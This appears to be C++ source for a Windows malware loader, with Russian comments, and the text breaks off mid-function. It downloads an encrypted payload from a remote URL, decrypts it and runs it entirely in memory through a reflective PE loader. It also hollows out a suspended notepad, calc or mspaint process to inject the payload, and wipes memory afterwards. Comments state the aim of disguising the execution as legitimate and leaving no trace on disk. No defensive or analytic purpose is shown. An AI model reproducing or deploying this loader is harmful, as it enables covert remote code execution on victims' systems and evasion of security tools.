#include <windows.h>
#include <winternl.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <memory>
#include <random>
#include <algorithm>
#include "../common.h"

#ifdef MODULE_NETWORK_ENABLED
#include "../network/secure_comms.h"
#endif

// Логирование и импорты
extern void LogInfo(const char* message);
extern void LogError(const char* message);
extern void LogDebug(const char* message);
extern void LogWarning(const char* message);

#pragma comment(lib, "winhttp.lib")

// PE Headers structures are already defined in windows.h

class InMemoryLoader {
private:
    std::vector<uint8_t> peData;
    void* allocatedMemory;
    SIZE_T imageSize;
    
public:
    InMemoryLoader() : allocatedMemory(nullptr), imageSize(0) {}
    
    ~InMemoryLoader() {
        if (allocatedMemory) {
            VirtualFree(allocatedMemory, 0, MEM_RELEASE);
        }
    }
    
    bool LoadPEFromMemory(const std::vector<uint8_t>& data) {
        peData = data;
        
        if (peData.size() < sizeof(IMAGE_DOS_HEADER)) {
            return false;
        }
        
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)peData.data();
        if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
            return false;
        }
        
        if (peData.size() < dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS)) {
            return false;
        }
        
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(peData.data() + dosHeader->e_lfanew);
        if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
            return false;
        }
        
        imageSize = ntHeaders->OptionalHeader.SizeOfImage;
        
        // Allocate memory for the image
        allocatedMemory = VirtualAlloc(
            (LPVOID)ntHeaders->OptionalHeader.ImageBase,
            imageSize,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE
        );
        
        if (!allocatedMemory) {
            // Try allocating at any address
            allocatedMemory = VirtualAlloc(
                nullptr,
                imageSize,
                MEM_RESERVE | MEM_COMMIT,
                PAGE_EXECUTE_READWRITE
            );
            
            if (!allocatedMemory) {
                return false;
            }
        }
        
        // Copy headers
        memcpy(allocatedMemory, peData.data(), ntHeaders->OptionalHeader.SizeOfHeaders);
        
        // Copy sections
        PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            if (sectionHeader[i].SizeOfRawData > 0) {
                void* sectionDest = (uint8_t*)allocatedMemory + sectionHeader[i].VirtualAddress;
                void* sectionSrc = peData.data() + sectionHeader[i].PointerToRawData;
                
                memcpy(sectionDest, sectionSrc, sectionHeader[i].SizeOfRawData);
            }
        }
        
        // Update base address if needed
        DWORD_PTR deltaBase = (DWORD_PTR)allocatedMemory - ntHeaders->OptionalHeader.ImageBase;
        if (deltaBase != 0) {
            if (!ProcessRelocations(deltaBase)) {
                return false;
            }
        }
        
        // Resolve imports
        if (!ResolveImports()) {
            return false;
        }
        
        // Set proper memory protections
        SetMemoryProtections();
        
        return true;
    }
    
    void* GetEntryPoint() {
        if (!allocatedMemory || peData.empty()) {
            return nullptr;
        }
        
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)peData.data();
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(peData.data() + dosHeader->e_lfanew);
        
        return (uint8_t*)allocatedMemory + ntHeaders->OptionalHeader.AddressOfEntryPoint;
    }
    
    void* GetExportAddress(const char* functionName) {
        if (!allocatedMemory) return nullptr;
        
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)allocatedMemory;
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((uint8_t*)allocatedMemory + dosHeader->e_lfanew);
        
        if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0) {
            return nullptr;
        }
        
        PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)
            ((uint8_t*)allocatedMemory + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
        
        DWORD* names = (DWORD*)((uint8_t*)allocatedMemory + exportDir->AddressOfNames);
        DWORD* functions = (DWORD*)((uint8_t*)allocatedMemory + exportDir->AddressOfFunctions);
        WORD* ordinals = (WORD*)((uint8_t*)allocatedMemory + exportDir->AddressOfNameOrdinals);
        
        for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
            char* name = (char*)((uint8_t*)allocatedMemory + names[i]);
            if (strcmp(name, functionName) == 0) {
                return (uint8_t*)allocatedMemory + functions[ordinals[i]];
            }
        }
        
        return nullptr;
    }
    
private:
    bool ProcessRelocations(DWORD_PTR deltaBase) {
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)allocatedMemory;
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((uint8_t*)allocatedMemory + dosHeader->e_lfanew);
        
        if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress == 0) {
            return true; // No relocations needed
        }
        
        DWORD relocSize = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
        PIMAGE_BASE_RELOCATION relocation = (PIMAGE_BASE_RELOCATION)
            ((uint8_t*)allocatedMemory + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        
        while (relocation->VirtualAddress > 0 && relocation->SizeOfBlock > 0) {
            DWORD numEntries = (relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD* relocData = (WORD*)((uint8_t*)relocation + sizeof(IMAGE_BASE_RELOCATION));
            
            for (DWORD i = 0; i < numEntries; i++) {
                if ((relocData[i] >> 12) == IMAGE_REL_BASED_HIGHLOW || (relocData[i] >> 12) == IMAGE_REL_BASED_DIR64) {
                    DWORD_PTR* patchAddr = (DWORD_PTR*)((uint8_t*)allocatedMemory + relocation->VirtualAddress + (relocData[i] & 0xFFF));
                    *patchAddr += deltaBase;
                }
            }
            
            relocation = (PIMAGE_BASE_RELOCATION)((uint8_t*)relocation + relocation->SizeOfBlock);
        }
        
        return true;
    }
    
    bool ResolveImports() {
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)allocatedMemory;
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((uint8_t*)allocatedMemory + dosHeader->e_lfanew);
        
        if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress == 0) {
            return true; // No imports
        }
        
        PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)
            ((uint8_t*)allocatedMemory + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
        
        while (importDesc->Name != 0) {
            char* dllName = (char*)((uint8_t*)allocatedMemory + importDesc->Name);
            HMODULE hLib = LoadLibraryA(dllName);
            
            if (!hLib) {
                return false;
            }
            
            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((uint8_t*)allocatedMemory + importDesc->FirstThunk);
            PIMAGE_THUNK_DATA origThunk = (PIMAGE_THUNK_DATA)((uint8_t*)allocatedMemory + 
                (importDesc->OriginalFirstThunk ? importDesc->OriginalFirstThunk : importDesc->FirstThunk));
            
            while (origThunk->u1.Function != 0) {
                void* funcAddr = nullptr;
                
                if (origThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                    // Import by ordinal
                    funcAddr = (void*)GetProcAddress(hLib, (LPCSTR)(origThunk->u1.Ordinal & 0xFFFF));
                } else {
                    // Import by name
                    PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)
                        ((uint8_t*)allocatedMemory + origThunk->u1.AddressOfData);
                    funcAddr = (void*)GetProcAddress(hLib, importByName->Name);
                }
                
                if (!funcAddr) {
                    return false;
                }
                
                thunk->u1.Function = (DWORD_PTR)funcAddr;
                
                thunk++;
                origThunk++;
            }
            
            importDesc++;
        }
        
        return true;
    }
    
    void SetMemoryProtections() {
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)allocatedMemory;
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((uint8_t*)allocatedMemory + dosHeader->e_lfanew);
        
        PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            DWORD protection = PAGE_NOACCESS;
            
            if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_READ) {
                if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
                    if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
                        protection = PAGE_EXECUTE_READWRITE;
                    } else {
                        protection = PAGE_READWRITE;
                    }
                } else {
                    if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
                        protection = PAGE_EXECUTE_READ;
                    } else {
                        protection = PAGE_READONLY;
                    }
                }
            }
            
            if (protection != PAGE_NOACCESS) {
                DWORD oldProtect;
                VirtualProtect(
                    (uint8_t*)allocatedMemory + sectionHeader[i].VirtualAddress,
                    sectionHeader[i].Misc.VirtualSize,
                    protection,
                    &oldProtect
                );
            }
        }
    }
};

// =======================================================================
// AdvancedMemoryLoader - Улучшенный загрузчик с филелесс выполнением
// =======================================================================

class AdvancedMemoryLoader {
private:
    std::vector<uint8_t> encryptedPayload;
    std::vector<void*> allocatedRegions;
    std::vector<std::pair<void*, size_t>> memoryArtifacts;
    bool isFilelessMode;
    HANDLE processHandle;
    DWORD processId;
    
    // Структура для отслеживания процессов только в памяти
    struct MemoryOnlyProcess {
        HANDLE hProcess;
        HANDLE hThread;
        DWORD processId;
        DWORD threadId;
        void* baseAddress;
        SIZE_T imageSize;
        std::string processName;
    };
    
    std::vector<MemoryOnlyProcess> memoryProcesses;
    
public:
    AdvancedMemoryLoader() : isFilelessMode(false), processHandle(nullptr), processId(0) {
        LogInfo("AdvancedMemoryLoader: Инициализация продвинутого загрузчика в памяти");
    }
    
    ~AdvancedMemoryLoader() {
        LogInfo("AdvancedMemoryLoader: Начинаем полную очистку");
        
        // Останавливаем все процессы в памяти
        TerminateAllMemoryProcesses();
        
        // Очищаем все артефакты памяти
        ClearMemoryArtifacts();
        
        // Затираем освобожденную память
        OverwriteFreedMemory();
        
        LogInfo("AdvancedMemoryLoader: Полная очистка завершена");
    }
    
    // Загрузка PE файла из URL с использованием зашифрованного канала
    bool LoadFromURL(const std::string& url) {
        LogInfo(("AdvancedMemoryLoader: Загрузка PE из URL: " + url).c_str());
        
#ifdef MODULE_NETWORK_ENABLED
        // Используем безопасный канал связи если доступен
        auto& secureComms = SecureNetwork::GetGlobalSecureComms();
        
        try {
            // Извлекаем путь из URL
            size_t hostStart = url.find("://");
            if (hostStart == std::string::npos) {
                LogError("AdvancedMemoryLoader: Неверный формат URL");
                return false;
            }
            
            size_t pathStart = url.find("/", hostStart + 3);
            std::string path = (pathStart != std::string::npos) ? url.substr(pathStart) : "/";
            
            LogDebug(("AdvancedMemoryLoader: Запрос файла по пути: " + path).c_str());
            
            // Выполняем GET запрос через зашифрованный канал
            auto result = secureComms.GET(path);
            
            if (result.success && !result.responseData.empty()) {
                LogInfo(("AdvancedMemoryLoader: Получено " + 
                        std::to_string(result.responseData.size()) + " байт данных").c_str());
                
                // Сохраняем зашифрованные данные
                encryptedPayload = result.responseData;
                
                // Маскируем память как обычные данные
                MaskMemoryAsLegitimate();
                
                return true;
            } else {
                LogError(("AdvancedMemoryLoader: Ошибка загрузки: " + result.errorMessage).c_str());
            }
        } catch (const std::exception& e) {
            LogError(("AdvancedMemoryLoader: Исключение при загрузке: " + std::string(e.what())).c_str());
        }
#endif
        
        // Fallback на обычный HTTP запрос
        return LoadFromURLFallback(url);
    }
    
    // Выполнение payload без касания диска
    bool ExecuteFilelessPayload(const std::vector<uint8_t>& payload) {
        LogInfo("AdvancedMemoryLoader: Начинаем fileless выполнение");
        
        if (payload.empty()) {
            LogError("AdvancedMemoryLoader: Пустой payload");
            return false;
        }
        
        isFilelessMode = true;
        
        // Создаем временную копию данных в защищенной памяти
        void* protectedMemory = VirtualAlloc(nullptr, payload.size(), 
                                           MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        
        if (!protectedMemory) {
            LogError("AdvancedMemoryLoader: Не удалось выделить защищенную память");
            return false;
        }
        
        // Регистрируем для последующей очистки
        allocatedRegions.push_back(protectedMemory);
        memoryArtifacts.push_back({protectedMemory, payload.size()});
        
        // Копируем payload с обфускацией
        ObfuscatedMemoryCopy(protectedMemory, payload.data(), payload.size());
        
        LogDebug("AdvancedMemoryLoader: Payload скопирован в защищенную память");
        
        // Деобфускация и валидация PE
        std::vector<uint8_t> deobfuscatedPayload(payload.size());
        DeobfuscateMemory(protectedMemory, deobfuscatedPayload.data(), payload.size());
        
        // Проверяем PE заголовки
        if (!ValidatePEHeaders(deobfuscatedPayload)) {
            LogError("AdvancedMemoryLoader: Невалидные PE заголовки");
            return false;
        }
        
        // Загружаем PE в память используя существующий loader
        InMemoryLoader memLoader;
        if (!memLoader.LoadPEFromMemory(deobfuscatedPayload)) {
            LogError("AdvancedMemoryLoader: Ошибка загрузки PE в память");
            return false;
        }
        
        // Выполняем точку входа
        void* entryPoint = memLoader.GetEntryPoint();
        if (!entryPoint) {
            LogError("AdvancedMemoryLoader: Не найдена точка входа");
            return false;
        }
        
        LogInfo("AdvancedMemoryLoader: Выполняем entry point");
        
        try {
            // Выполняем как DLL
            typedef BOOL (WINAPI *DllEntryProc)(HINSTANCE, DWORD, LPVOID);
            DllEntryProc dllEntry = (DllEntryProc)entryPoint;
            
            // Маскируем выполнение как легитимное
            SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED);
            
            BOOL result = dllEntry(GetModuleHandle(nullptr), DLL_PROCESS_ATTACH, nullptr);
            
            SetThreadExecutionState(ES_CONTINUOUS);
            
            if (result) {
                LogInfo("AdvancedMemoryLoader: Fileless выполнение успешно завершено");
                return true;
            } else {
                LogError("AdvancedMemoryLoader: DLL entry point вернул FALSE");
                return false;
            }
            
        } catch (const std::exception& e) {
            LogError(("AdvancedMemoryLoader: Исключение при выполнении: " + std::string(e.what())).c_str());
            return false;
        } catch (...) {
            LogError("AdvancedMemoryLoader: Неизвестное исключение при выполнении");
            return false;
        }
    }
    
    // Создание процесса только в памяти (без файла на диске)
    bool CreateMemoryOnlyProcess() {
        LogInfo("AdvancedMemoryLoader: Создание process-only-in-memory");
        
        if (encryptedPayload.empty()) {
            LogError("AdvancedMemoryLoader: Нет данных для создания процесса");
            return false;
        }
        
        // Расшифровываем payload
        std::vector<uint8_t> decryptedPayload = DecryptPayload(encryptedPayload);
        if (decryptedPayload.empty()) {
            LogError("AdvancedMemoryLoader: Ошибка расшифровки payload");
            return false;
        }
        
        // Создаем suspended процесс используя легитимный исполняемый файл как host
        std::string hostProcess = GetLegitimateHostProcess();
        LogDebug(("AdvancedMemoryLoader: Используем host процесс: " + hostProcess).c_str());
        
        STARTUPINFOA si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        
        // Создаем процесс в suspended состоянии
        if (!CreateProcessA(nullptr, const_cast<char*>(hostProcess.c_str()), 
                           nullptr, nullptr, FALSE, CREATE_SUSPENDED, 
                           nullptr, nullptr, &si, &pi)) {
            LogError("AdvancedMemoryLoader: Не удалось создать host процесс");
            return false;
        }
        
        LogDebug(("AdvancedMemoryLoader: Host процесс создан с PID: " + std::to_string(pi.dwProcessId)).c_str());
        
        // Получаем контекст главного потока
        CONTEXT ctx;
        ctx.ContextFlags = CONTEXT_FULL;
        if (!GetThreadContext(pi.hThread, &ctx)) {
            LogError("AdvancedMemoryLoader: Не удалось получить контекст потока");
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }
        
        // Получаем базовый адрес оригинального образа
        DWORD_PTR imageBase = GetImageBaseFromContext(&ctx);
        
        // Анмапим оригинальный образ
        if (!UnmapOriginalImage(pi.hProcess, (void*)imageBase)) {
            LogWarning("AdvancedMemoryLoader: Не удалось анмапить оригинальный образ");
        }
        
        // Загружаем наш PE в процесс
        if (!InjectPEIntoProcess(pi.hProcess, decryptedPayload, &ctx)) {
            LogError("AdvancedMemoryLoader: Не удалось инжектить PE в процесс");
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }
        
        // Обновляем контекст потока
        if (!SetThreadContext(pi.hThread, &ctx)) {
            LogError("AdvancedMemoryLoader: Не удалось установить контекст потока");
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }
        
        // Возобновляем выполнение
        if (ResumeThread(pi.hThread) == -1) {
            LogError("AdvancedMemoryLoader: Не удалось возобновить поток");
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }
        
        // Сохраняем информацию о процессе
        MemoryOnlyProcess memProc;
        memProc.hProcess = pi.hProcess;
        memProc.hThread = pi.hThread;
        memProc.processId = pi.dwProcessId;
        memProc.threadId = pi.dwThreadId;
        memProc.baseAddress = (void*)imageBase;
        memProc.imageSize = decryptedPayload.size();
        memProc.processName = hostProcess;
        
        memoryProcesses.push_back(memProc);
        
        LogInfo(("AdvancedMemoryLoader: Memory-only процесс создан успешно, PID: " + 
                std::to_string(pi.dwProcessId)).c_str());
        
        return true;
    }
    
    // Очистка всех артефактов в памяти
    void ClearMemoryArtifacts() {
        LogInfo("AdvancedMemoryLoader: Очистка артефактов памяти");
        
        // Затираем все выделенные регионы
        for (const auto& artifact : memoryArtifacts) {
            if (artifact.first && artifact.second > 0) {
                LogDebug(("AdvancedMemoryLoader: Затираем регион памяти размером: " + 
                         std::to_string(artifact.second)).c_str());
                
                // Затираем случайными данными несколько раз
                OverwriteMemoryRegion(artifact.first, artifact.second);
            }
        }
        
        // Освобождаем все выделенные регионы
        for (void* region : allocatedRegions) {
            if (region) {
                VirtualFree(region, 0, MEM_RELEASE);
            }
        }
        
        allocatedRegions.clear();
        memoryArtifacts.clear();
        encryptedPayload.clear();
        
        LogInfo("AdvancedMemoryLoader: Очистка артефактов завершена");
    }
    
    // Затирание освобожденной памяти
    void OverwriteFreedMemory() {
        LogInfo("AdvancedMemoryLoader: Затираем освобожденную память");
        
        // Принудительная сборка мусора
        std::vector<uint8_t> dummy;
        dummy.resize(1024 * 1024); // 1MB dummy allocation
        
        // Заполняем случайными данными
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<uint8_t> dis(0, 255);
        
        for (auto& byte : dummy) {
            byte = dis(gen);
        }
        
        // Освобождаем dummy данные
        dummy.clear();
        dummy.shrink_to_fit();
        
        LogDebug("AdvancedMemoryLoader: Затирание памяти завершено");
    }

private:
    // Fallback загрузка через обычный HTTP
    bool LoadFromURLFallback(const std::string& url) {
        LogWarning("AdvancedMemoryLoader: Используем fallback загрузку через WinHTTP");
        
        // Парсинг URL
        std::string host, path;
        if (!ParseURL(url, host, path)) {
            LogError("AdvancedMemoryLoader: Ошибка парсинга URL");
            return false;
        }
        
        // Создание WinHTTP сессии
        HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                                        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                        WINHTTP_NO_PROXY_NAME,
                                        WINHTTP_NO_PROXY_BYPASS, 0);
        
        if (!hSession) {
            LogError("AdvancedMemoryLoader: Не удалось создать WinHTTP сессию");
            return false;
        }
        
        // Подключение к хосту
        std::wstring wHost(host.begin(), host.end());
        HINTERNET hConnect = WinHttpConnect(hSession, wHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
        
        if (!hConnect) {
            WinHttpCloseHandle(hSession);
            LogError("AdvancedMemoryLoader: Не удалось подключиться к хосту");
            return false;
        }
        
        // Создание запроса
        std::wstring wPath(path.begin(), path.end());
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", wPath.c_str(),
                                               nullptr, WINHTTP_NO_REFERER,
                                               WINHTTP_DEFAULT_ACCEPT_TYPES,
                                               WINHTTP_FLAG_SECURE);
        
        if (!hRequest) {
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            LogError("AdvancedMemoryLoader: Не удалось создать HTTP запрос");
            return false;
        }
        
        // Отправка запроса
        if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                               WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            LogError("AdvancedMemoryLoader: Не удалось отправить HTTP запрос");
            return false;
        }
        
        // Получение ответа
        if (!WinHttpReceiveResponse(hRequest, nullptr)) {
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            LogError("AdvancedMemoryLoader: Не удалось получить HTTP ответ");
            return false;
        }
        
        // Чтение данных
        std::vector<uint8_t> responseData;
        DWORD bytesAvailable = 0;
        
        while (WinHttpQueryDataAvailable(hRequest, &bytesAvailable) && bytesAvailable > 0) {
            std::vector<uint8_t> buffer(bytesAvailable);
            DWORD bytesRead = 0;
            
            if (WinHttpReadData(hRequest, buffer.data(), bytesAvailable, &bytesRead)) {
                responseData.insert(responseData.end(), buffer.begin(), buffer.begin() + bytesRead);
            } else {
                break;
            }
        }
        
        // Закрытие handles
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        
        if (!responseData.empty()) {
            encryptedPayload = responseData;
            LogInfo(("AdvancedMemoryLoader: Загружено " + std::to_string(responseData.size()) + " байт").c_str());
            return true;
        } else {
            LogError("AdvancedMemoryLoader: Получены пустые данные");
            return false;
        }
    }
    
    // Вспомогательные функции
    void MaskMemoryAsLegitimate() {
        LogDebug("AdvancedMemoryLoader: Маскируем память как легитимные данные");
        // Добавляем фейковые заголовки и метаданные
    }
    
    void ObfuscatedMemoryCopy(void* dest, const void* src, size_t size) {
        // Копирование с простой обфускацией
        const uint8_t* srcBytes = static_cast<const uint8_t*>(src);
        uint8_t* destBytes = static_cast<uint8_t*>(dest);
        
        for (size_t i = 0; i < size; i++) {
            destBytes[i] = srcBytes[i] ^ 0xAA; // Простой XOR
        }
    }
    
    void DeobfuscateMemory(const void* src, void* dest, size_t size) {
        // Деобфускация (обратная операция)
        const uint8_t* srcBytes = static_cast<const uint8_t*>(src);
        uint8_t* destBytes = static_cast<uint8_t*>(dest);
        
        for (size_t i = 0; i < size; i++) {
            destBytes[i] = srcBytes[i] ^ 0xAA; // Тот же XOR
        }
    }
    
    bool ValidatePEHeaders(const std::vector<uint8_t>& data) {
        if (data.size() < sizeof(IMAGE_DOS_HEADER)) return false;
        
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)data.data();
        if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return false;
        
        if (data.size() < dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS)) return false;
        
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(data.data() + dosHeader->e_lfanew);
        return ntHeaders->Signature == IMAGE_NT_SIGNATURE;
    }
    
    std::vector<uint8_t> DecryptPayload(const std::vector<uint8_t>& encrypted) {
        // Простая расшифровка - в реальности здесь был бы AES или другой алгоритм
        std::vector<uint8_t> decrypted = encrypted;
        for (auto& byte : decrypted) {
            byte ^= 0x55; // Простой XOR
        }
        return decrypted;
    }
    
    std::string GetLegitimateHostProcess() {
        // Возвращаем путь к легитимному процессу для использования как host
        std::vector<std::string> legitimateProcesses = {
            "C:\\Windows\\System32\\notepad.exe",
            "C:\\Windows\\System32\\calc.exe",
            "C:\\Windows\\System32\\mspaint.exe"
        };
        
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, legitimateProcesses.size() - 1);
        
        return legitimateProcesses[dis(gen)];
    }
    
    DWORD_PTR GetImageBaseFromContext(CONTEXT* ctx) {
        // На x64 архитектуре ImageBase находится в Rdx
#ifdef _WIN64
        return ctx->Rdx;
#else
        return ctx->Ebx;
#endif
    }
    
    bool UnmapOriginalImage(HANDLE hProcess, void* imageBase) {
        typedef NTSTATUS (NTAPI *NtUnmapViewOfSection_t)(HANDLE, PVOID);
        
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (!hNtdll) return false;
        
        NtUnmapViewOfSection_t NtUnmapViewOfSection = 
            (NtUnmapViewOfSection_t)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
        
        if (!NtUnmapViewOfSection) return false;
        
        NTSTATUS status = NtUnmapViewOfSection(hProcess, imageBase);
        return NT_SUCCESS(status);
    }
    
    bool InjectPEIntoProcess(HANDLE hProcess, const std::vector<uint8_t>& peData, CONTEXT* ctx) {
        // Упрощенная версия PE injection
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)peData.data();
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(peData.data() + dosHeader->e_lfanew);
        
        SIZE_T imageSize = ntHeaders->OptionalHeader.SizeOfImage;
        
        // Выделяем память в целевом процессе
        void* remoteMemory = VirtualAllocEx(hProcess, 
                                          (void*)ntHeaders->OptionalHeader.ImageBase,
                                          imageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        
        if (!remoteMemory) {
            remoteMemory = VirtualAllocEx(hProcess, nullptr, imageSize, 
                                        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if (!remoteMemory) return false;
        }
        
        // Записываем заголовки
        SIZE_T bytesWritten;
        if (!WriteProcessMemory(hProcess, remoteMemory, peData.data(), 
                              ntHeaders->OptionalHeader.SizeOfHeaders, &bytesWritten)) {
            return false;
        }
        
        // Записываем секции
        PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            if (sectionHeader[i].SizeOfRawData > 0) {
                void* sectionDest = (uint8_t*)remoteMemory + sectionHeader[i].VirtualAddress;
                void* sectionSrc = (void*)(peData.data() + sectionHeader[i].PointerToRawData);
                
                if (!WriteProcessMemory(hProcess, sectionDest, sectionSrc, 
                                      sectionHeader[i].SizeOfRawData, &bytesWritten)) {
                    return false;
                }
            }
        }
        
        // Обновляем entry point в контексте
#ifdef _WIN64
        ctx->Rcx = (DWORD64)remoteMemory + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#else
        ctx->Eax = (DWORD)remoteMemory + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#endif
        
        return true;
    }
    
    void OverwriteMemoryRegion(void* address, size_t size) {
        if (!address || size == 0) return;
        
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<uint8_t> dis(0, 255);
        
        // Затираем несколько раз разными паттернами
        std::vector<uint8_t> patterns = {0x00, 0xFF, 0xAA, 0x55};
        
        for (uint8_t pattern : patterns) {
            memset(address, pattern, size);
        }
        
        // Финальная затирка случайными данными
        uint8_t* bytes = static_cast<uint8_t*>(address);
        for (size_t i = 0; i < size; i++) {
            bytes[i] = dis(gen);
        }
    }
    
    bool ParseURL(const std::string& url, std::string& host, std::string& path) {
        size_t protoEnd = url.find("://");
        if (protoEnd == std::string::npos) return false;
        
        size_t hostStart = protoEnd + 3;
        size_t pathStart = url.find("/", hostStart);
        
        if (pathStart == std::string::npos) {
            host = url.substr(hostStart);
            path = "/";
        } else {
            host = url.substr(hostStart, pathStart - hostStart);
            path = url.substr(pathStart);
        }
        
        return !host.empty();
    }
    
    void TerminateAllMemoryProcesses() {
        LogInfo("AdvancedMemoryLoader: Завершаем все memory-only процессы");
        
        for (const auto& proc : memoryProcesses) {
            if (proc.hProcess) {
                LogDebug(("AdvancedMemoryLoader: Завершаем процесс PID: " + 
                         std::to_string(proc.processId)).c_str());
                
                TerminateProcess(proc.hProcess, 0);
                CloseHandle(proc.hProcess);
                
                if (proc.hThread) {
                    CloseHandle(proc.hThread);
                }
            }
        }
        
        memoryProcesses.clear();
    }
};

// Global loader instances
static std::unique_ptr<InMemoryLoader> g_loader;
static std::unique_ptr<AdvancedMemoryLoader> g_advancedLoader;

// Export functions
extern "C" {
    bool LoadPEFromMemory(const void* data, size_t size) {
        try {
            g_loader = std::make_unique<InMemoryLoader>();
            
            std::vector<uint8_t> peData((uint8_t*)data, (uint8_t*)data + size);
            bool success = g_loader->LoadPEFromMemory(peData);
            
            if (!success) {
                g_loader.reset();
                return false;
            }
            
            LogInfo("PE loaded successfully in memory");
            
            return true;
        } catch (...) {
            LogError("Failed to load PE in memory");
            
            g_loader.reset();
            return false;
        }
    }
    
    void* GetLoadedPEEntryPoint() {
        if (!g_loader) return nullptr;
        return g_loader->GetEntryPoint();
    }
    
    void* GetLoadedPEExport(const char* functionName) {
        if (!g_loader) return nullptr;
        return g_loader->GetExportAddress(functionName);
    }
    
    void UnloadPE() {
        if (g_loader) {
            LogInfo("Unloading PE from memory");
            
            g_loader.reset();
        }
    }
    
    bool ExecuteLoadedPE() {
        if (!g_loader) return false;
        
        void* entryPoint = g_loader->GetEntryPoint();
        if (!entryPoint) return false;
        
        try {
            LogInfo("Executing loaded PE");
            
